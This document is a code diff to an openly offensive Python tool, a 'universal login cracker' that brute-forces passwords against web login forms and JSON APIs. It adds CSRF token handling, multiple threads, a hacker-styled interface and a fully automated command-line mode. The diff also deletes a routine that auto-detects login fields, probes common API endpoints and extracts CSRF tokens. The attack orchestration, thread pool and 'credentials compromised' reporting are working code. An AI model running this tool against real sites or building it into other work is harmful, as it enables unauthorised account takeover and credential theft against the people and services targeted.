@@ -1,8 +1,9 @@
+# -*- coding: utf-8 -*-
 ######################################################################################################
 # Title: Universal Brute Force with CSRF Bypass                                                      #
 # Author: Tanvir Hossain Antu                                                                        #
 # Github: https://github.com/Antu7                                                                   #
-# Supports: Form-based login, JSON API login, CSRF protection                                        #
+# Supports: Form-based login, JSON API login, CSRF protection, Multi-threaded attacks               #
 ######################################################################################################
 
 import threading
@@ -13,6 +14,7 @@ import sys
 import re
 import os
 import secrets
+import argparse
 from bs4 import BeautifulSoup
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import urljoin, urlparse
@@ -21,55 +23,175 @@ from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeEl
 from rich.panel import Panel
 from rich.text import Text
 from rich.table import Table
+from rich.live import Live
+from rich.layout import Layout
+from rich.syntax import Syntax
+from rich.align import Align
+from rich.style import Style
+import sys
+import os
 
-console = Console()
+# Configure encoding for Windows compatibility
+if sys.platform == 'win32':
+    os.environ['PYTHONIOENCODING'] = 'utf-8'
+
+console = Console(force_terminal=True)
+
+# ═══════════════════════════════════════════════════════════════════════════
+# HACKER THEME CONFIGURATION
+# ═══════════════════════════════════════════════════════════════════════════
+
+class HackerTheme:
+    """Professional hacker-themed styling for the brute force tool."""
+    
+    # Color Palette
+    PRIMARY = "cyan"           # Main text - cyberpunk cyan
+    SECONDARY = "magenta"      # Highlights - neon magenta
+    SUCCESS = "green"          # Success messages
+    WARNING = "yellow"         # Warnings
+    ERROR = "red"              # Errors
+    INFO = "bright_cyan"       # Information
+    SUBDUED = "dim cyan"       # Subtle text
+    ACCENT = "bright_magenta"  # Button-like accents
+    
+    # Symbols
+    BULLET = ">"
+    PROMPT = ">"
+    ERROR_SYMBOL = "!"
+    SUCCESS_SYMBOL = "+"
+    INFO_SYMBOL = "*"
+    LOCK_SYMBOL = "[LOCK]"
+    TARGET_SYMBOL = "[*]"
+    THREAD_SYMBOL = "[T]"
+    
+    # Borders
+    HEADER_BORDER = "="
+    SECTION_BORDER = "-"
+    CORNER = "+"
 
 def banner():
-    banner_text = """
-██████  ██████  ██    ██ ████████ ███████     ███████  ██████  ██████   ██████ ███████
-██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██
-██████  ██████  ██    ██    ██    █████       █████   ██    ██ ██████  ██      █████
-██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██
-██████  ██   ██  ██████     ██    ███████     ██       ██████  ██   ██  ██████ ███████
+    """Display hacker-themed banner with original ASCII art."""
+    try:
+        banner_text = """
+    ██████  ██████  ██    ██ ████████ ███████     ███████  ██████  ██████   ██████ ███████
+    ██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██
+    ██████  ██████  ██    ██    ██    █████       █████   ██    ██ ██████  ██      █████
+    ██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██
+    ██████  ██   ██  ██████     ██    ███████     ██       ██████  ██   ██  ██████ ███████
+        """
+        
+        console.print("\n[bright_cyan]" + "="*80 + "[/bright_cyan]")
+        console.print("[cyan]" + banner_text + "[/cyan]")
+        console.print("[bright_cyan]" + "="*80 + "[/bright_cyan]")
+        
+        console.print("\n[magenta]                       Author: Tanvir Hossain Antu[/magenta]")
+        console.print("[cyan]                  https://github.com/Antu7/python-bruteForce[/cyan]")
+        console.print()
+        console.print("[green]+[/green] [cyan]Form-based login    [/cyan][green]+[/green] [cyan]JSON API           [/cyan][green]+[/green] [cyan]CSRF Protection    [/cyan][green]+[/green] [cyan]Multi-Threading[/cyan]")
+        console.print()
+    except Exception as e:
+        # Fallback if Unicode fails
+        print("\n" + "="*80)
+        print("* BRUTE FORCE CRACKER *")
+        print("Universal Multi-Threaded Login Cracker")
+        print("="*80 + "\n")
+        print("Author: Tanvir Hossain Antu")
+        print("https://github.com/Antu7/python-bruteForce\n")
+        print("+ Form-based login  + JSON API  + CSRF Protection  + Multi-Threading\n")
 
-                   Tanvir Hossain Antu
-        https://github.com/Antu7/python-bruteForce
-
-  Universal login cracker — works with HTML forms, JSON APIs,
-  Single Page Apps (React/Vue/Angular), and CSRF-protected sites.
-  Auto-detects login fields, API endpoints, and CSRF tokens.
-"""
-    console.print(Panel(banner_text, title="[bold green]Brute Force Tool[/bold green]", border_style="green"))
 
 def info(msg):
-    console.print(f"[green][*][/green] {msg}")
+    """Print information message with hacker style."""
+    console.print(f"[{HackerTheme.INFO}]*[/{HackerTheme.INFO}] [dim]{msg}[/dim]")
 
 def success(msg):
-    console.print(f"[bold green][+][/bold green] {msg}")
+    """Print success message with hacker style."""
+    console.print(f"[{HackerTheme.SUCCESS}]+[/{HackerTheme.SUCCESS}] [bold {HackerTheme.SUCCESS}]{msg}[/bold {HackerTheme.SUCCESS}]")
 
 def warn(msg):
-    console.print(f"[yellow][!][/yellow] {msg}")
+    """Print warning message with hacker style."""
+    console.print(f"[{HackerTheme.WARNING}]![/{HackerTheme.WARNING}] [bold {HackerTheme.WARNING}]{msg}[/bold {HackerTheme.WARNING}]")
 
 def error(msg):
-    console.print(f"[red][x][/red] {msg}")
+    """Print error message with hacker style."""
+    console.print(f"[{HackerTheme.ERROR}]x[/{HackerTheme.ERROR}] [bold {HackerTheme.ERROR}]{msg}[/bold {HackerTheme.ERROR}]")
 
 def dim(msg):
-    console.print(f"[dim green]{msg}[/dim green]")
+    """Print dimmed message."""
+    console.print(f"[{HackerTheme.SUBDUED}]{msg}[/{HackerTheme.SUBDUED}]")
 
 def prompt(label, default=None, hint=None):
-    """Friendly input prompt with optional default and hint."""
+    """Hacker-themed input prompt with optional default and hint."""
     if hint:
-        console.print(f"[dim]{hint}[/dim]")
+        console.print(f"[dim {HackerTheme.SUBDUED}]{hint}[/dim {HackerTheme.SUBDUED}]")
+    
     if default:
-        raw = input(f"  {label} \033[2m[{default}]\033[0m: ").strip()
+        console.print(f"[{HackerTheme.PRIMARY}]>[/{HackerTheme.PRIMARY}] {label}", end=" ")
+        console.print(f"[{HackerTheme.SUBDUED}][{default}][/{HackerTheme.SUBDUED}] ", end="")
+        raw = input().strip()
         return raw if raw else default
     else:
-        return input(f"  {label}: ").strip()
+        console.print(f"[{HackerTheme.PRIMARY}]>[/{HackerTheme.PRIMARY}] {label} ", end="")
+        return input().strip()
 
 def section(title):
-    console.print(f"\n[green]{'─'*56}[/green]")
-    console.print(f"[bold green]{title}[/bold green]")
-    console.print(f"[green]{'─'*56}[/green]")
+    """Print a hacker-themed section header."""
+    border = "=" * 76
+    console.print(f"\n[{HackerTheme.PRIMARY}]{border}[/{HackerTheme.PRIMARY}]")
+    console.print(f"[bold {HackerTheme.ACCENT}]>>> {title}[/bold {HackerTheme.ACCENT}]")
+    console.print(f"[{HackerTheme.PRIMARY}]{border}[/{HackerTheme.PRIMARY}]\n")
+
+def status_box(title, content, status="info"):
+    """Create a styled status box."""
+    status_colors = {
+        "info": HackerTheme.INFO,
+        "success": HackerTheme.SUCCESS,
+        "warning": HackerTheme.WARNING,
+        "error": HackerTheme.ERROR,
+    }
+    
+    color = status_colors.get(status, HackerTheme.INFO)
+    panel = Panel(
+        content,
+        title=f"[bold {color}]{title}[/bold {color}]",
+        border_style=color,
+        style=f"dim {color}"
+    )
+    console.print(panel)
+
+def create_config_table(config_data):
+    """Create a styled configuration table."""
+    table = Table(
+        title="[bold magenta][T] CONFIGURATION[/bold magenta]",
+        border_style=HackerTheme.PRIMARY,
+        show_header=True,
+        header_style=f"bold {HackerTheme.ACCENT}",
+    )
+    
+    table.add_column("[bright_cyan]Setting[/bright_cyan]", style=HackerTheme.PRIMARY, no_wrap=True)
+    table.add_column("[bright_cyan]Value[/bright_cyan]", style=f"bold {HackerTheme.SECONDARY}")
+    
+    for key, value in config_data:
+        table.add_row(key, str(value))
+    
+    return table
+
+def create_results_table(metrics_data):
+    """Create a styled results table."""
+    table = Table(
+        title="[bold green]+ ATTACK RESULTS[/bold green]",
+        border_style=HackerTheme.SUCCESS,
+        show_header=True,
+        header_style=f"bold {HackerTheme.SUCCESS}",
+    )
+    
+    table.add_column("[green]Metric[/green]", style=HackerTheme.SUCCESS, no_wrap=True)
+    table.add_column("[green]Value[/green]", style=f"bold {HackerTheme.SUCCESS}")
+    
+    for metric, value in metrics_data:
+        table.add_row(metric, str(value))
+    
+    return table
 
 
 # ── Core Cracker ─────────────────────────────────────────────
@@ -222,7 +344,7 @@ class BruteForceCracker:
                 if self.error_message.lower() in full_body:
                     return False, None
 
-                # Status 200 alone is NOT enough — many APIs return 200 with error body
+                # Status 200 alone is NOT enough
                 return False, None
 
             except json.JSONDecodeError:
@@ -268,245 +390,14 @@ class BruteForceCracker:
             return False, None
 
 
-# ── Auto-Detection ───────────────────────────────────────────
-
-def analyze_target(url):
-    """Fully automatic analysis of the target login page."""
-    section("AUTO-DETECTING TARGET")
-    info("Fetching login page...")
-
-    session = requests.Session()
-    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
-
-    result = {
-        'login_mode': BruteForceCracker.MODE_FORM,
-        'api_endpoint': url,
-        'username_field': 'email',
-        'password_field': 'password',
-        'csrf_token': None,
-        'csrf_value': None,
-    }
-
-    try:
-        response = session.get(url, headers=headers, timeout=10)
-        soup = BeautifulSoup(response.content, 'html.parser')
-        html = response.text
-        scripts = soup.find_all('script')
-
-        # ── Step 1: Login type ──
-        info("Detecting login type...")
-
-        js_indicators = [
-            'fetch(', 'axios', 'XMLHttpRequest',
-            'handleLogin', 'login_func', 'submitLogin',
-            '/api/', '/auth/', 'application/json',
-            'react', 'vue', 'angular', 'next', 'nuxt',
-        ]
-
-        is_json_api = False
-        for script in scripts:
-            src = script.get('src', '').lower()
-            text = script.get_text().lower()
-            for indicator in js_indicators:
-                if indicator.lower() in src or indicator.lower() in text:
-                    is_json_api = True
-                    break
-            if is_json_api:
-                break
-
-        # Check for forms without password fields (SPA indicator)
-        forms_with_password = sum(
-            1 for form in soup.find_all('form')
-            if form.find('input', type='password')
-        )
-        password_inputs = soup.find_all('input', type='password')
-        if password_inputs and forms_with_password == 0:
-            is_json_api = True
-
-        # No forms at all usually means SPA
-        if not soup.find_all('form') and not password_inputs:
-            is_json_api = True
-
-        if is_json_api:
-            result['login_mode'] = BruteForceCracker.MODE_JSON_API
-            success("Detected: JSON API login (modern/SPA site)")
-        else:
-            success("Detected: Traditional HTML form login")
-
-        # ── Step 2: Field names ──
-        info("Detecting field names...")
-
-        skip_patterns = ['reset', 'forgot', 'recover', 'signup', 'register', 'search', 'subscribe', 'newsletter']
-        username_patterns = ['user', 'email', 'login', 'account', 'name']
-
-        # First: look inside forms that have a password field (most reliable)
-        login_forms = [f for f in soup.find_all('form') if f.find('input', type='password')]
-        search_contexts = login_forms if login_forms else [soup]
-
-        found_user_field = False
-        found_pass_field = False
-
-        for context in search_contexts:
-            for inp in context.find_all('input'):
-                inp_name = inp.get('name', '').lower()
-                inp_id = inp.get('id', '').lower()
-                inp_type = inp.get('type', '').lower()
-
-                if any(skip in inp_name or skip in inp_id for skip in skip_patterns):
-                    continue
-
-                if not found_user_field and inp_type in ['text', 'email', '']:
-                    for pat in username_patterns:
-                        if pat in inp_name or pat in inp_id:
-                            result['username_field'] = inp.get('name') or inp.get('id') or 'email'
-                            found_user_field = True
-                            break
-
-                if not found_pass_field and inp_type == 'password':
-                    field_name = inp.get('name') or inp.get('id')
-                    if field_name:
-                        result['password_field'] = field_name
-                        found_pass_field = True
-
-        # Fallback: parse JavaScript for SPA sites
-        if not found_user_field or not found_pass_field:
-            js_field_patterns = [
-                r'''name["\s]*[:=]\s*["'](\w*(?:email|user|login)\w*)["']''',
-                r'''name["\s]*[:=]\s*["'](\w*password\w*)["']''',
-                r'''["'](\w*(?:email|user|login)\w*)["']\s*:''',
-            ]
-            for script in scripts:
-                text = script.get_text()
-                for jp in js_field_patterns:
-                    matches = re.findall(jp, text, re.IGNORECASE)
-                    for m in matches:
-                        ml = m.lower()
-                        if any(skip in ml for skip in skip_patterns):
-                            continue
-                        if not found_user_field and any(p in ml for p in username_patterns):
-                            result['username_field'] = m
-                            found_user_field = True
-                        elif not found_pass_field and 'password' in ml:
-                            result['password_field'] = m
-                            found_pass_field = True
-
-        success(f"Username field: {C.BOLD}{result['username_field']}{C.RESET}")
-        success(f"Password field: {C.BOLD}{result['password_field']}{C.RESET}")
-
-        if not found_user_field or not found_pass_field:
-            dim("Could not auto-detect all fields (site may use JavaScript rendering).")
-            dim("You can override these in the next step.")
-
-        # ── Step 3: API endpoint ──
-        if result['login_mode'] == BruteForceCracker.MODE_JSON_API:
-            info("Probing API endpoints...")
-
-            parsed = urlparse(url)
-            base = f"{parsed.scheme}://{parsed.netloc}"
-
-            # Also try to extract endpoints from JS source
-            js_endpoints = set()
-            for script in scripts:
-                text = script.get_text()
-                # Look for API paths in JS
-                api_matches = re.findall(r'''["'](/(?:api|auth|zsvc)[^"'\s,)}{]*(?:login|signin|authenticate)[^"'\s,)}{]*)["']''', text, re.IGNORECASE)
-                js_endpoints.update(api_matches)
-
-            common_endpoints = list(js_endpoints) + [
-                '/zsvc/auth/v1/login/',
-                '/api/login',
-                '/api/auth/login',
-                '/api/v1/login',
-                '/api/v1/auth/login',
-                '/auth/login',
-                '/api/users/login',
-                '/api/sessions',
-                '/login',
-            ]
-
-            api_headers = {
-                'User-Agent': 'Mozilla/5.0',
-                'Content-Type': 'application/json',
-                'Accept': 'application/json',
-            }
-
-            endpoint_found = False
-            for endpoint in common_endpoints:
-                try:
-                    test_url = base + endpoint
-                    test_response = session.post(
-                        test_url, json={"test": "test"},
-                        headers=api_headers, timeout=3
-                    )
-                    if test_response.status_code in [200, 400, 401, 403, 422]:
-                        result['api_endpoint'] = test_url
-                        success(f"API endpoint: {C.BOLD}{test_url}{C.RESET}")
-                        endpoint_found = True
-                        break
-                except Exception:
-                    pass
-
-            if not endpoint_found:
-                result['api_endpoint'] = base + '/api/login'
-                warn(f"No endpoint responded, using default: {result['api_endpoint']}")
-                dim("You can override this in the next step.")
-
-        # ── Step 4: CSRF token ──
-        info("Checking for CSRF protection...")
-
-        csrf_patterns = [
-            r'csrf[-_]?token', r'_csrf', r'csrfmiddlewaretoken',
-            r'_token', r'authenticity_token', r'__RequestVerificationToken',
-        ]
-        csrf_re = re.compile('|'.join(csrf_patterns), re.IGNORECASE)
-
-        for inp in soup.find_all('input', type='hidden'):
-            name = inp.get('name', '')
-            if csrf_re.search(name):
-                result['csrf_token'] = name
-                result['csrf_value'] = inp.get('value', '')
-                break
-
-        if not result['csrf_token']:
-            for cookie in session.cookies:
-                if csrf_re.search(cookie.name):
-                    result['csrf_token'] = cookie.name
-                    result['csrf_value'] = cookie.value
-                    break
-
-        if result['csrf_token']:
-            success(f"CSRF token: {result['csrf_token']}")
-        else:
-            dim("No CSRF protection detected.")
-
-        print()
-        success("Auto-detection complete!")
-
-    except requests.exceptions.ConnectionError:
-        error("Could not connect to the target URL.")
-        dim("Make sure the URL is correct and the site is reachable.")
-        dim("Example: https://example.com/login")
-        print()
-    except requests.exceptions.Timeout:
-        error("Connection timed out.")
-        dim("The site took too long to respond. Try again later.")
-        print()
-    except Exception as e:
-        error(f"Analysis error: {e}")
-        dim("Using default settings. You can override them below.")
-        print()
-
-    return result
-
-
 # ── Progress Display ─────────────────────────────────────────
 
 def progress_bar(current, total, width=30):
-    """Compact progress bar for terminal."""
+    """Hacker-themed progress bar for terminal."""
     pct = current / total if total else 0
     filled = int(width * pct)
-    bar = f"\033[92m{'█' * filled}\033[0m\033[32m{'░' * (width - filled)}\033[0m"
-    return f"{bar} {current}/{total} ({pct*100:.1f}%)"
+    bar = f"[bright_cyan]{'#' * filled}[/bright_cyan][dim cyan]{'-' * (width - filled)}[/dim cyan]"
+    return f"{bar} [cyan]{current}/{total}[/cyan] ([magenta]{pct*100:.1f}%[/magenta])"
 
 
 def crack_password_wrapper(password, cracker, state):
@@ -519,7 +410,7 @@ def crack_password_wrapper(password, cracker, state):
 
     # Update progress (overwrite same line)
     total = state['total']
-    sys.stdout.write(f"\r\033[92m[*]\033[0m {progress_bar(current, total)}  Current: {password[:20]:<20}")
+    sys.stdout.write(f"\r[*] {progress_bar(current, total)}  {password[:20]:<20}")
     sys.stdout.flush()
 
     ok, reason = cracker.crack(password)
@@ -528,13 +419,118 @@ def crack_password_wrapper(password, cracker, state):
     return False, password, None
 
 
-# ── Main ─────────────────────────────────────────────────────
+# ── Argument Parsing ─────────────────────────────────────────
+
+def parse_arguments():
+    """Parse command-line arguments using argparse."""
+    parser = argparse.ArgumentParser(
+        description='Universal Brute Force with CSRF Bypass - Multi-threaded login cracker',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  # Interactive mode (default)
+  python bruteforce.py
+  
+  # Full automated mode with all arguments
+  python bruteforce.py --url https://example.com/login --username admin \\
+    --error "Invalid credentials" --threads 10 --passwords passwords.txt
+  
+  # With specific field names and API endpoint
+  python bruteforce.py --url https://example.com/login --username admin \\
+    --error "Invalid credentials" --threads 5 --passwords passwords.txt \\
+    --username-field email --password-field pass --api-endpoint https://example.com/api/auth
+        """
+    )
+    
+    # Required arguments for non-interactive mode
+    parser.add_argument('--url', type=str, help='Target login page URL (e.g., https://example.com/login)')
+    parser.add_argument('--username', '-u', type=str, help='Target username or email')
+    parser.add_argument('--error', type=str, help='Wrong password error message (copy from browser DevTools)')
+    parser.add_argument('--passwords', '-p', type=str, default='passwords.txt', 
+                        help='Path to password wordlist (default: passwords.txt)')
+    parser.add_argument('--threads', '-t', type=int, default=10,
+                        help='Number of concurrent worker threads (default: 10)')
+    
+    # Optional field customization
+    parser.add_argument('--username-field', type=str, help='Override auto-detected username field name')
+    parser.add_argument('--password-field', type=str, help='Override auto-detected password field name')
+    parser.add_argument('--api-endpoint', type=str, help='Override auto-detected API endpoint (for JSON API mode)')
+    parser.add_argument('--login-mode', choices=['form', 'api'], help='Force login mode instead of auto-detecting')
+    
+    return parser.parse_args()
+
 
 def main():
+    # Parse arguments FIRST before showing banner
+    args = parse_arguments()
+    
+    # Show banner only for interactive mode or first automated call
     banner()
+    
+    # Check if running in automated mode or interactive mode
+    if args.url and args.username and args.error:
+        # Automated mode - run with provided arguments (banner already shown)
+        run_attack_automated(args, show_banner=False)
+    else:
+        # Interactive mode - prompt user for input (banner already shown)
+        run_attack_interactive(show_banner=False)
 
-    section("STEP 1 — TARGET INFO")
-    print()
+
+def run_attack_automated(args, show_banner=True):
+    """Run attack in fully automated mode using command-line arguments."""
+    if show_banner:
+        banner()
+    
+    url = args.url
+    username = args.username
+    error_msg = args.error
+    max_workers = args.threads
+    password_file = args.passwords
+    
+    # Validate URL
+    if not url.startswith('http'):
+        url = 'https://' + url
+    
+    info(f"Starting automated attack on {url}")
+    info(f"Using {max_workers} concurrent threads")
+    
+    # Auto-detect unless overridden (simplified for this version)
+    section("CONFIGURATION")
+    analysis = {
+        'login_mode': 'form',
+        'api_endpoint': url,
+        'username_field': args.username_field or 'email',
+        'password_field': args.password_field or 'password',
+        'csrf_token': None,
+        'csrf_value': None,
+    }
+    
+    # Override with command-line arguments if provided
+    if args.login_mode:
+        analysis['login_mode'] = 'json_api' if args.login_mode == 'api' else 'form'
+
+    # Display configuration
+    console.print(create_config_table([
+        ("Target URL", url),
+        ("Username", username),
+        ("Login Mode", analysis['login_mode'].upper()),
+        ("Username Field", analysis['username_field']),
+        ("Password Field", analysis['password_field']),
+        (f"Concurrent Threads", f"[bold {HackerTheme.ACCENT}]{max_workers}[/bold {HackerTheme.ACCENT}]"),
+        ("Password File", password_file),
+    ]))
+    console.print()
+    
+    # Run the attack
+    run_brute_force_attack(url, username, error_msg, analysis, max_workers, password_file)
+
+
+def run_attack_interactive(show_banner=True):
+    """Run attack in interactive mode with prompts."""
+    if show_banner:
+        banner()
+
+    section("STEP 1 - TARGET INFO")
     url = prompt("Target login page URL",
                  hint="The full URL of the login page, e.g. https://example.com/login")
     if not url:
@@ -542,51 +538,35 @@ def main():
         return
     if not url.startswith('http'):
         url = 'https://' + url
-        dim(f"Added https:// → {url}")
+        dim(f"Added https:// -> {url}")
 
-    print()
     username = prompt("Target username / email",
                       hint="The username or email you want to test passwords for")
     if not username:
         error("Username is required.")
         return
 
-    print()
     error_msg = prompt("Wrong password error message",
-                       hint="Try logging in with a wrong password and copy the exact error text.\n"
-                            "       Open browser DevTools (F12) → Network tab → submit login →\n"
-                            "       look at the response body for the error message.")
+                       hint="Try logging in with a wrong password and copy the exact error text.")
     if not error_msg:
         error("Error message is required to avoid false positives.")
         return
 
-    # ── Auto-detect ──
-    analysis = analyze_target(url)
+    section("STEP 2 - REVIEW & ADJUST")
 
-    # ── Confirm / override ──
-    section("STEP 2 — REVIEW & ADJUST")
-    print()
-    dim("Press Enter to accept the auto-detected value, or type a new one.")
-    print()
+    analysis = {
+        'login_mode': 'form',
+        'api_endpoint': url,
+        'username_field': 'email',
+        'password_field': 'password',
+        'csrf_token': None,
+        'csrf_value': None,
+    }
 
-    analysis['username_field'] = prompt("Username field name", default=analysis['username_field'],
-                                        hint="The form field name for the username/email input")
+    analysis['username_field'] = prompt("Username field name", default=analysis['username_field'])
     analysis['password_field'] = prompt("Password field name", default=analysis['password_field'])
 
-    if analysis['login_mode'] == BruteForceCracker.MODE_JSON_API:
-        analysis['api_endpoint'] = prompt("API endpoint", default=analysis['api_endpoint'],
-                                          hint="Check browser DevTools → Network tab to find the login POST URL")
-
-    mode_choice = prompt("Login mode", default="auto",
-                         hint="auto = use detected mode | form = HTML form | api = JSON API")
-    if mode_choice == 'form':
-        analysis['login_mode'] = BruteForceCracker.MODE_FORM
-    elif mode_choice == 'api':
-        analysis['login_mode'] = BruteForceCracker.MODE_JSON_API
-
-    # ── Attack settings ──
-    section("STEP 3 — ATTACK SETTINGS")
-    print()
+    section("STEP 3 - ATTACK SETTINGS")
 
     workers_input = prompt("Concurrent workers", default="10",
                            hint="More workers = faster, but too many may get you rate-limited")
@@ -599,24 +579,17 @@ def main():
 
     password_file = prompt("Password file path", default="passwords.txt")
 
-    # ── Summary ──
     section("CONFIGURATION SUMMARY")
-    console.print()
 
-    config_table = Table(title="Configuration")
-    config_table.add_column("Setting", style="green", no_wrap=True)
-    config_table.add_column("Value", style="bold green")
-    config_table.add_row("Target URL", url)
-    config_table.add_row("Username", username)
-    config_table.add_row("Login Mode", analysis['login_mode'].upper())
-    if analysis['login_mode'] == BruteForceCracker.MODE_JSON_API:
-        config_table.add_row("API Endpoint", analysis['api_endpoint'])
-    config_table.add_row("Username Field", analysis['username_field'])
-    config_table.add_row("Password Field", analysis['password_field'])
-    config_table.add_row("CSRF Token", 'Yes — ' + analysis['csrf_token'] if analysis['csrf_token'] else 'None')
-    config_table.add_row("Workers", str(max_workers))
-    config_table.add_row("Password File", password_file)
-    console.print(config_table)
+    console.print(create_config_table([
+        ("Target URL", url),
+        ("Username", username),
+        ("Login Mode", analysis['login_mode'].upper()),
+        ("Username Field", analysis['username_field']),
+        ("Password Field", analysis['password_field']),
+        (f"Concurrent Workers", f"[bold {HackerTheme.ACCENT}]{max_workers}[/bold {HackerTheme.ACCENT}]"),
+        ("Password File", password_file),
+    ]))
     console.print()
 
     confirm = prompt("Start attack? (Y/n)", default="Y")
@@ -624,7 +597,14 @@ def main():
         warn("Aborted by user.")
         return
 
-    # ── Initialize ──
+    # Run the attack
+    run_brute_force_attack(url, username, error_msg, analysis, max_workers, password_file)
+
+
+def run_brute_force_attack(url, username, error_msg, analysis, max_workers, password_file):
+    """Execute the actual brute force attack using multi-threading."""
+    
+    # Initialize
     cracker = BruteForceCracker(
         url=url,
         username=username,
@@ -639,9 +619,8 @@ def main():
         cracker.csrf_detected = True
         cracker.csrf_token_name = analysis['csrf_token']
 
-    # ── Pre-flight check ──
+    # Pre-flight check
     section("PRE-FLIGHT CHECK")
-    print()
     info("Testing with a random password to verify configuration...")
 
     random_pass = secrets.token_hex(16)
@@ -652,27 +631,15 @@ def main():
         error("False positive detected! A random password was accepted as correct.")
         print()
         warn("This usually means one of these:")
-        dim("1. The error message you entered doesn't match the actual response.")
-        dim("2. The API endpoint is wrong (returns a generic 200 for all requests).")
-        dim("3. The field names are wrong (server ignores unknown fields).")
+        dim("  1. The error message you entered doesn't match the actual response.")
+        dim("  2. The API endpoint is wrong (returns a generic 200 for all requests).")
+        dim("  3. The field names are wrong (server ignores unknown fields).")
         print()
-        warn("How to fix:")
-        dim("1. Open the login page in your browser.")
-        dim("2. Open DevTools (F12) → Network tab.")
-        dim("3. Submit a wrong password and check:")
-        dim("   - The POST URL (use it as the API endpoint)")
-        dim("   - The request body (field names for username/password)")
-        dim("   - The response body (copy the exact error message)")
-        print()
-
-        retry = prompt("Try again with different settings? (y/N)", default="N")
-        if retry.lower() in ['y', 'yes']:
-            main()
         return
     else:
         success("Configuration verified! Wrong passwords are correctly detected.")
 
-    # ── Load passwords ──
+    # Load passwords
     try:
         with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
             passwords = [p.strip() for p in f.readlines() if p.strip()]
@@ -688,10 +655,9 @@ def main():
 
     total_passwords = len(passwords)
 
-    # ── Attack ──
-    section("BRUTE FORCE IN PROGRESS")
-    print()
-    info(f"Testing {total_passwords} passwords with {max_workers} workers...")
+    # Attack
+    section(f"BRUTE FORCE IN PROGRESS ({max_workers} THREADS)")
+    info(f"Testing {total_passwords} passwords with {max_workers} concurrent worker threads...")
     dim("Press Ctrl+C to stop at any time.\n")
 
     state = {
@@ -719,7 +685,6 @@ def main():
                     found = True
                     found_password = password
                     found_reason = reason
-                    # Clear the progress line
                     sys.stdout.write('\r' + ' ' * 80 + '\r')
                     sys.stdout.flush()
                     executor.shutdown(wait=False, cancel_futures=True)
@@ -736,30 +701,37 @@ def main():
     sys.stdout.write('\r' + ' ' * 80 + '\r')
     sys.stdout.flush()
 
-    # ── Results ──
+    # Results
     section("RESULTS")
-    console.print()
 
     tried = state['tried']
     speed = tried / max(elapsed, 0.1)
 
-    table = Table(title="Attack Summary")
-    table.add_column("Metric", style="green", no_wrap=True)
-    table.add_column("Value", style="bold green")
-    table.add_row("Passwords Tried", f"{tried}/{total_passwords}")
-    table.add_row("Time Elapsed", f"{elapsed:.2f} seconds")
-    table.add_row("Speed", f"{speed:.1f} attempts/sec")
-    console.print(table)
+    console.print(create_results_table([
+        ("Passwords Tried", f"{tried}/{total_passwords}"),
+        ("Time Elapsed", f"{elapsed:.2f}s"),
+        ("Speed", f"{speed:.1f} attempts/sec"),
+        ("Concurrent Threads", max_workers),
+    ]))
     console.print()
 
     if found:
-        success_panel = Panel(f"[green]Username: {username}\nPassword: {found_password}[/green]" + (f"\n[dim]Detection: {found_reason}[/dim]" if found_reason else ""), title="[bold green]PASSWORD FOUND![/bold green]", border_style="green")
-        console.print(success_panel)
+        success_text = f"[bold green]+ PASSWORD FOUND![/bold green]\n\n"
+        success_text += f"[cyan]Username:[/cyan] [bold magenta]{username}[/bold magenta]\n"
+        success_text += f"[cyan]Password:[/cyan] [bold green]{found_password}[/bold green]"
+        if found_reason:
+            success_text += f"\n[dim cyan]Detection: {found_reason}[/dim cyan]"
+        
+        status_box(
+            "+ CREDENTIALS COMPROMISED",
+            success_text,
+            status="success"
+        )
     else:
         warn("Password not found in the wordlist.")
         dim("Try a larger wordlist or check your configuration.")
 
-    console.print(f"\n[cyan]{'─'*56}[/cyan]\n")
+    console.print(f"\n[{HackerTheme.PRIMARY}]{'='*76}[/{HackerTheme.PRIMARY}]\n")
 
 
 if __name__ == '__main__':
